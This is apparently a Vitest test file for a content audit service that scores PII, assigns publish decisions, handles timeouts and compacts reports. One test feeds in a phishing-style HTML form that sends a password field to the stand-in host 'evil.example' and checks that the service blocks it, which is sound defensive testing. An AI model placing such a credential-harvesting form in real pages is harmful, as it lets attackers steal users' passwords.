import { describe, expect, it } from 'vitest'
import { createRequire } from 'node:module'

const require = createRequire(import.meta.url)
const {
  compactReport,
  piiScore,
  publishDecisionFor,
  runAudit,
  runWithTimeout,
} = require('../src/modules/creatorAudit/audit.service')

describe('creator audit scoring', () => {
  it('scores PII counts using the locked buckets', () => {
    expect(piiScore(0)).toBe(100)
    expect(piiScore(3)).toBe(80)
    expect(piiScore(10)).toBe(50)
    expect(piiScore(11)).toBe(20)
  })

  it('maps publish decisions from grade and HTML tier', () => {
    expect(publishDecisionFor({ grade: 'A', htmlTier: 0 })).toBe('allowed')
    expect(publishDecisionFor({ grade: 'D', htmlTier: 0 })).toBe('requires_acknowledgement')
    expect(publishDecisionFor({ grade: 'F', htmlTier: 0 })).toBe('blocked')
    expect(publishDecisionFor({ grade: 'A', htmlTier: 3 })).toBe('blocked')
  })
})

describe('runWithTimeout', () => {
  it('returns a conservative timed-out result instead of throwing', async () => {
    const result = await runWithTimeout('slow', () => new Promise(() => {}), 1)

    expect(result).toMatchObject({ name: 'slow', score: 70, timedOut: true })
  })
})

describe('runAudit', () => {
  it('returns an A-grade allowed report for clean content', async () => {
    const report = await runAudit({
      userId: 7,
      contentHtml: '<h1>Clean guide</h1><h2>Overview</h2><p>Plain study content.</p>',
    })

    expect(report.grade).toBe('A')
    expect(report.publishDecision).toBe('allowed')
    expect(report.userId).toBe(7)
    expect(report.checks.pii.findings).toEqual([])
  })

  it('blocks tier-3 HTML regardless of the aggregate score', async () => {
    const report = await runAudit({
      contentHtml:
        '<form action="https://evil.example"><input type="password" name="password"></form>',
    })

    expect(report.htmlTier).toBe(3)
    expect(report.publishDecision).toBe('blocked')
  })

  it('never returns raw PII text in findings', async () => {
    const report = await runAudit({ contentHtml: '<p>Contact jane@example.edu</p>' })
    const serialized = JSON.stringify(report)

    expect(serialized).not.toContain('jane@example.edu')
    expect(report.checks.pii.counts.email).toBe(1)
  })
})

describe('compactReport', () => {
  it('caps oversized reports and records the original finding count', () => {
    const report = {
      findings: Array.from({ length: 5000 }, (_, index) => ({ message: `finding ${index}` })),
      checks: { pii: { findings: Array.from({ length: 5000 }, () => ({ kind: 'email' })) } },
    }

    const compacted = compactReport(report)

    expect(compacted.truncated).toBe(true)
    expect(compacted.totalFindings).toBe(5000)
    expect(compacted.truncatedFindings).toBe(4900)
    expect(compacted.truncatedFindingsBySeverity.unknown).toBe(4900)
    expect(Buffer.byteLength(JSON.stringify(compacted), 'utf8')).toBeLessThanOrEqual(50 * 1024)
  })
})
